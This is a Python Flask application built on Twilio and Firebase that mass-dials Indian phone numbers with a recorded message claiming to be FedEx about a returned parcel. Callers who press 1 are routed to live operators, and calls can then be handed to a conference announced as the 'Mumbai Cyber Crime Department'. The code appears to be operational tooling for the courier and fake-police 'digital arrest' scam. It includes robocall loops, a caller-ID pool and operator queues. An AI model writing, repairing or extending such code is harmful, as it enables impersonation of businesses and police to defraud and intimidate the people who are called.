from flask import Flask, request, Response, render_template , jsonify
from twilio.rest import Client
from twilio.twiml.voice_response import VoiceResponse, Gather, Dial
import firebase_admin
from firebase_admin import credentials, db
import time
import os
from dotenv import load_dotenv
import random
from functools import wraps
from flask import Flask, jsonify




load_dotenv()

# Initialize Firebase Admin

firebase_admin_sdk_key = {
    "type": os.getenv('FIREBASE_ADMIN_SDK_KEY_TYPE'),
    "project_id": os.getenv('FIREBASE_ADMIN_SDK_KEY_PROJECT_ID'),
    "private_key_id": os.getenv('FIREBASE_ADMIN_SDK_KEY_PRIVATE_KEY_ID'),
    "private_key": os.getenv('FIREBASE_ADMIN_SDK_KEY_PRIVATE_KEY').replace('\\n', '\n'),
    "client_email": os.getenv('FIREBASE_ADMIN_SDK_KEY_CLIENT_EMAIL'),
    "client_id": os.getenv('FIREBASE_ADMIN_SDK_KEY_CLIENT_ID'),
    "auth_uri": os.getenv('FIREBASE_ADMIN_SDK_KEY_AUTH_URI'),
    "token_uri": os.getenv('FIREBASE_ADMIN_SDK_KEY_TOKEN_URI'),
    "auth_provider_x509_cert_url": os.getenv('FIREBASE_ADMIN_SDK_KEY_AUTH_PROVIDER'),
    "client_x509_cert_url": os.getenv('FIREBASE_ADMIN_SDK_KEY_CLIENT_URL'),
    "universe_domain": os.getenv('UNIVERSE_DOMAIN')
}

if not firebase_admin._apps:
    cred = credentials.Certificate(firebase_admin_sdk_key)
    firebase_admin.initialize_app(cred, {
        'databaseURL': os.getenv('FIREBASE_ADMIN_SDK_KEY_DATABASE_URL')
    })

app = Flask(__name__)

RUN_URL = 'https://fedex-live.vercel.app/'

# Twilio Credentials
account_sid = os.getenv('TWILIO_SDK_SID')
auth_token = os.getenv('TWILIO_SDK_TOKEN')
client = Client(account_sid, auth_token)

# Firebase Refs
calllogs_ref = db.reference('/calllogs/')
executives_ref = db.reference('/cexecutives/')
customers_ref = db.reference('/customers/')
crimeexecutives_ref = db.reference('/crimeexecutives/')

# Messages
initial_message = 'This is calling from Fedex international courier service. Your parcel has been returned. Please press 1 for more information.'
hold_message = 'Please wait while we are transferring the call to FedEx international courier service.'
transfer_message = 'This call has been transferred to the Mumbai Cyber Crime Department.'
from_phone_numbers = [
    '+15163364128'
]

@app.route('/')
def login():
    return render_template('login.html')

@app.route('/home')
def home():
    return render_template('index.html')

@app.route('/manage-call')
def manage_call():
    return render_template('manageCall.html')

# Global variable to control the call process state
is_paused = False

@app.route('/call/pause', methods=['POST'])
def pause_calls():
    """Pauses outgoing calls."""
    global is_paused
    is_paused = True
    return jsonify({"message": "Call process paused"}), 200

@app.route('/call/play', methods=['POST'])
def play_calls():
    """Resumes outgoing calls from where it left off."""
    global is_paused
    is_paused = False
    # Restart the calling process where it left off
    # Use the remaining numbers to continue
    return make_call()

@app.route('/make-call', methods=['POST'])
def make_call():
    """Initiates or resumes calls to customer numbers."""
    global is_paused
    customer_numbers = request.json.get('phoneNumbers', [])
    if not customer_numbers:
        return {'message': 'No customers to call'}, 200

    interval = 200
    for phone in customer_numbers:
        if is_paused:
            # Exit the loop if paused
            break

        to = str(phone)
        if not to.startswith('+'):
            to = '+91' + to

        free_executive = find_free_executive()
        if not free_executive:
            time.sleep(0.5)
            interval += 500
            continue

        from_number = random.choice(from_phone_numbers)
        try:
            call = client.calls.create(
                url=RUN_URL + '/voice-response',
                to=to,
                from_=from_number,
                status_callback=RUN_URL + '/call-status',
                status_callback_event=['completed', 'failed', 'busy', 'no-answer']
            )

            calllogs_ref.child(call.sid).set({
                'receiver': to,
                'from': from_number,
                'executive': free_executive,
                'status': 'ongoing',
                'sid': call.sid,
            })

            time.sleep(interval / 1000)

            if interval > 200:
                interval -= 500
            if interval < 200:
                interval = 200

        except Exception as e:
            print(f'Error: {e}')

    return {'message': 'Calls paused' if is_paused else 'Calls completed or ongoing'}, 200

@app.route('/voice-response', methods=['POST'])
def voice_response():
    """Handles the initial voice response and call forwarding."""
    response = VoiceResponse()
    gather = Gather(num_digits=1, action='/gather-response', method='POST', timeout=15)
    gather.say(initial_message , voice='Polly.Amy')
    response.append(gather)

    response.say('No input received. Goodbye.',voice='Polly.Amy')
    response.hangup()

    return Response(str(response), mimetype='text/xml')

@app.route('/gather-response', methods=['POST'])
def gather_response():
    """Handles customer's input and forwards to an executive."""
    digits = request.form.get('Digits')
    response = VoiceResponse()

    if digits == '1':
        response.say(hold_message,voice='Polly.Amy')
        free_executive = find_free_executive()
        if free_executive:
            # Dial the executive and wait for their input
            mark_executive_busy(free_executive, True)
            dial = Dial()  # Change the action to ongoing-call
            dial.number(free_executive)
            response.append(dial)
            response.play('https://firebasestorage.googleapis.com/v0/b/chicken-stew.appspot.com/o/627275__tyops__calm-and-sad-%5BAudioTrimmer.com%5D.wav?alt=media&token=9911d20b-1924-4d24-86c2-59f78d161d5e')
            response.say(hold_message,voice='Polly.Amy')
        else:
            response.say('All customer care executives are busy. Please try again later.',voice='Polly.Amy')

        response.hangup()
    else:
        response.say('Invalid input. Goodbye.',voice='Polly.Amy')
        response.hangup()

    return Response(str(response), mimetype='text/xml')

@app.route('/transfer', methods=['POST'])
def transfer():
    sid = request.json.get('sid')
    if not sid:
        return jsonify({"error": "Missing 'sid' in the request body."}), 400

    try:
        client.calls(sid).update(url=RUN_URL + "/transfer-response")
        return jsonify({"message": "Call transfer initiated."}), 200
    except Exception as e:
        return jsonify({"error": str(e)}), 500

@app.route('/transfer-response', methods=['POST'])
def transfer_response():
    """Handles the transfer to the Cyber Crime Department."""
    response = VoiceResponse()
    free_crime_exec = find_free_crime_executive()

    # Generate a unique conference name based on call SID
    call_sid = request.form.get('CallSid')
    conference_name = f'CrimeDepartmentConference_{call_sid}'

    if free_crime_exec:
        # Create a unique conference
        response.dial().conference(conference_name)
        response.say("You are now connected with the Cyber Crime Department.", voice='Polly.Amy')
        
        client.calls.create(
            to=free_crime_exec,
            from_=from_phone_numbers[0],
            url=f"{RUN_URL}/conference-join?conference_name={conference_name}"
        )
    else:
        response.say("No available crime executives at the moment. Please try again later.", voice='Polly.Amy')
    
    return Response(str(response), mimetype='text/xml')


@app.route('/conference-join', methods=['POST'])
def conference_join():
    """Joins the crime executive into the specific conference room."""
    conference_name = request.args.get('conference_name')
    response = VoiceResponse()
    response.dial().conference(conference_name)
    return Response(str(response), mimetype='text/xml')


@app.route('/completed-call', methods=['POST'])
def completed_call():
    """Handles the call completion."""
    response = VoiceResponse()
    response.say("The call has ended. Thank you.",voice='Polly.Amy')
    return Response(str(response), mimetype='text/xml')

@app.route('/call-status', methods=['POST'])
def call_status():
    """Updates the call status in Firebase and marks executives as free if calls are completed."""
    call_sid = request.form.get('CallSid')
    call_status = request.form.get('CallStatus')
    
    if call_sid:
        if call_status == 'completed':
            # Retrieve the executive associated with the completed call
            executive_phone = get_executive_by_call_sid(call_sid)
            if executive_phone:
                mark_executive_busy(executive_phone, False)  # Set executive as free
            calllogs_ref.child(call_sid).delete()
        else:
            calllogs_ref.child(call_sid).update({'status': call_status})

    return '', 200

def get_executive_by_call_sid(call_sid):
    """Retrieves the executive's phone number associated with a given call SID."""
    call_log = calllogs_ref.child(call_sid).get()
    return call_log.get('executive') if call_log else None

def find_free_crime_executive():
    """Finds and returns a free crime executive."""
    crime_executives = crimeexecutives_ref.get()
    for exec_id, exec_data in crime_executives.items():
        if not exec_data.get('busy'):
            return exec_data.get('phone')
    return None

def mark_executive_busy(exec_phone, busy):
    """Updates the busy status of a customer care executive."""
    executives = executives_ref.get()
    for exec_id, exec_data in executives.items():
        if exec_data.get('phone') == exec_phone:
            executives_ref.child(exec_id).update({'busy': busy})
            break

def find_free_executive():
    """Finds and returns a free customer care executive."""
    executives = executives_ref.get()
    for exec_id, exec_data in executives.items():
        if not exec_data.get('busy'):
            return exec_data.get('phone')
    return None

def mark_crime_executive_busy(exec_phone, busy):
    """Updates the busy status of a crime executive."""
    crime_executives = crimeexecutives_ref.get()
    for exec_id, exec_data in crime_executives.items():
        if exec_data.get('phone') == exec_phone:
            crimeexecutives_ref.child(exec_id).update({'busy': busy})
            break

if __name__ == '__main__':
    app.run(port=5000)
